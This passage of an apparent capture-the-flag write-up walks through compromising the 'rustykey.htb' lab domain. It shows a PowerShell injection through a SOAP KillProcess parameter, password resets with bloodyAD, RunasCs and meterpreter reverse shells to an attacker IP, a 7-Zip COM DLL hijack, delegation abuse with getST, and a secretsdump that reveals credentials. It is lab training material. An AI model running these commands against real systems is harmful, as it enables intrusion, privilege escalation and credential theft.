Back on dnSpy, we can view the functions that we can call through SOAP: StartMonitoring() : // MonitoringService // Token: 0x06000004 RID: 4 RVA: 0x00002048 File Offset: 0x00000248 public string StartMonitoring() { if (this.isRunning) { return "Already monitoring."; } SystemEvents.SessionSwitch += this.SystemEvents_SessionSwitch; this.StartProcessWatcher(); this.isRunning = true; return "Monitoring started."; } Nothing interesting so far.. StopMonitoring() : // MonitoringService // Token: 0x06000005 RID: 5 RVA: 0x0000207B File Offset: 0x0000027B public string StopMonitoring() { if (!this.isRunning) { return "Monitoring not active."; } SystemEvents.SessionSwitch -= this.SystemEvents_SessionSwitch; this.processStartWatcher.Stop(); this.isRunning = false; return "Monitoring stopped."; } Nothing interesting here either. Now for KillProcess() : // MonitoringService // Token: 0x06000009 RID: 9 RVA: 0x000021A8 File Offset: 0x000003A8 public string KillProcess(string processName) { string scriptContents = "Stop-Process -Name " + processName + " -Force"; string result; try { using (Runspace runspace = RunspaceFactory.CreateRunspace()) { runspace.Open(); using (Pipeline pipeline = runspace.CreatePipeline()) { pipeline.Commands.AddScript(scriptContents); pipeline.Commands.Add("Out-String"); Collection<PSObject> collection = pipeline.Invoke(); runspace.Close(); StringBuilder stringBuilder = new StringBuilder(); foreach (PSObject psobject in collection) { stringBuilder.AppendLine(psobject.ToString()); } result = stringBuilder.ToString(); } } } catch (Exception ex) { result = "Error: " + ex.Message; } return result; } This one is interesting. We see the argument processName is being passed like we saw in the WSDL XMLs and it is being passed into the variable scriptContents which later gets run. If it results to an exception, it returns that error. What’s interesting is that we control processName , meaning we can inject a command there. Let’s start crafting our payload:

1. The SOAP envelope:​ <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> This is mandatory for all SOAP 1.1 requests. Envelope means “this is a SOAP message” The namespace http://schemas.xmlsoap.org/soap/envelope/ is fixed and never changes If this is missing, the server rejects the request 2. The SOAP body​ <soap:Body> The body contains the actual function call. SOAP envelopes can also have headers, but this service does not require any, so only the body is used. 3. The function call element​ <KillProcess xmlns="http://tempuri.org/"> This line is derived directly from the WSDL. KillProcess comes from: <wsdl:operation name="KillProcess"> The namespace http://tempuri.org/ comes from: targetNamespace="http://tempuri.org/" This element name must exactly match the operation name in the WSDL. If it does not, the service will not know which method to invoke. 4. The parameter element​ <processName> This comes from the XML schema in the WSDL: <xs:element name="processName"type="xs:string"/> This tells us: The parameter name is processName The value must be a string It must be inside the KillProcess element SOAP does name-based parameter binding. Order and spelling matter. 5. The injected payload​ foo; <our payload here> # This is just the value of the string parameter. SOAP does not care what the string contains. The vulnerability happens later when this string is concatenated into a PowerShell command without sanitization. Finally, let’s end this all with closing tags and get the final malicious XML: <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body> <KillProcess xmlns="http://tempuri.org/"> <processName> foo; < payload > # </processName> </KillProcess> </soap:Body> </soap:Envelope> Now we still need a payload. We can check its permissions: Get-ACL "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" | fl (the fl part is format list, otherwise we can’t really read the output properly) The output: Path : Microsoft.PowerShell.Core\Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32 Owner : BUILTIN\Administrators Group : RUSTYKEY\Domain Users Access : APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow ReadKey BUILTIN\Administrators Allow FullControl CREATOR OWNER Allow FullControl **RUSTYKEY\Support Allow FullControl** NT AUTHORITY\SYSTEM Allow FullControl BUILTIN\Administrators Allow FullControl BUILTIN\Users Allow ReadKey Audit : Sddl : O:BAG:DUD:AI(A;CIID;KR;;;AC)(A;ID;KA;;;BA)(A;CIIOID;KA;;;CO)(A;CIID;KA;;;S-1-5-21-3316070415-896458127-41393220 52-1132)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;BA)(A;CIID;KR;;;BU) Shows that the Support group has full control. Previously, we saw that ee.reed was in the support group, so it’s time to get access to her account.

We do the same attack, but this time we want access to ee.reed. First, let’s add ourselves back to the Helpdesk group: bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k \ add groupMember 'Helpdesk' 'IT-COMPUTER3$' then, let’s change the password of ee.reed: bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k \ set password 'ee.reed' 'NewP@ss123' ee.reed is part of the Protected Objects group because of the Support group, so we’ll have to remove that too bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k \ remove groupMember 'Protected Objects' 'Support' And now all that remains is to get the TGT: impacket-getTGT RUSTYKEY.HTB/'ee.reed':'NewP@ss123' However, when trying to authenticate using NetExec, evil-winrm or anything like that, we keep getting error messages. That means there is something blocking remote access, and ee.reed can only do local logins. This means that we’re going to have to use RunasCs.exe We get back into our winrm connection as bb.morgan, upload RunasCs.exe and run a reverse shell. We start a listener with penelope -p 1234 and then we run the shell: .\RunasCs.exe ee.reed 'NewP@ss123' powershell -r 10.10.14.132:1234 Now we have a shell as ee.reed

As we saw previously, ee.reed is part of the Support group who can modify the registry with the CLSID of 7zip. First, let’s get a DLL that will give us a reverse shell. We can craft one with msfvenom : msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.132 LPORT=9001 -f dll \ -o payload.dll We get our listener ready: msfconsole -q msf> use multi/handler msf> set payload windows/x64/meterpreter/reverse_tcp msf> set lhost 10.10.14.132 msf> set lport 9001 msf> set ExitOnSession false msf> exploit -j Then, we need to get our payload onto the target. For that, let’s start a python server to host the file python3 -m http.server 8000 On the target, head to C:\ProgramData and get the file: wget http://10.10.14.132:8000/payload.dll -o payl.dll Now, we need to point the 7zip CLSID to our malicious DLL: Set-ItemProperty "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32"-name "(default)" -value "C:\ProgramData\payl.dll" Now if we run Get-Item Get-Item "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" We see it is pointing to our dll: Name Property ---- -------- InprocServer32 (default) : C:\ProgramData\payl.dll ThreadingModel : Apartment Now, when a user tries to open up a 7zip file, it is going to access a dll and send us a reverse shell. Sure enough, after some time, we get a connection on our listener. After running whoami , we see that the shell we have is as mm.turner .

If we look at bloodhound’s outbound object controls for mm.turner, we see that he is part of the Delegation Manager groups, who can act on the DC This lets us do RBCD (Resource Based Constraint Delegation) so we need to get a user we want to delegate. If we look at the Administrator account, we see it has Trusted For Constrained Delegation: False so we can’t use that The same goes for the Backupadmin user. So let’s use our IT-COMPUTER3 account to impersonate other accounts (aka generate silver tickets). Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$ and we can confirm this worked through the command: Get-ADComputer DC -properties PrincipalsAllowedToDelegateToAccount DistinguishedName : CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb DNSHostName : dc.rustykey.htb Enabled : True Name : DC ObjectClass : computer ObjectGUID : dee94947-219e-4b13-9d41-543a4085431c PrincipalsAllowedToDelegateToAccount : {CN=**IT-Computer3**,OU=Computers,OU=IT,DC=rustykey,DC=htb} SamAccountName : DC$ SID : S-1-5-21-3316070415-896458127-4139322052-1000 UserPrincipalName : Now we just need the silver ticket: getST.py -spn cifs/dc.rustykey.htb -impersonate 'backupadmin' \ rustykey.htb/'IT-COMPUTER3$':'Rusty88!' Note: We don’t need to create a computer account in this case because we already know the password of IT-Computer3. The reason we create a new computer account usually in this attack is so that we can specify the password, which we don’t need to do here. Now we have the ccache of backupadmin (if we tried to do it with admin it would fail) so we can secretsdump: secretsdump.py rustykey.htb/'backupadmin'@dc.rustykey.htb -k -no-pass And in that command we see the following snippet: [--SNIP--] [*] $MACHINE.ACC RUSTYKEY\DC$:plain_password_hex: RUSTYKEY\DC$:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790::: [*] DefaultPassword **RUSTYKEY\Administrator:Rustyrc4key#!** [*] DPAPI_SYSTEM dpapi_machinekey:0x3c06efaf194382750e12c00cd141d275522d8397 dpapi_userkey:0xb833c05f4c4824a112f04f2761df11fefc578f5c [--SNIP--] Which shows the password of Administrator being Rustyrc4key#!
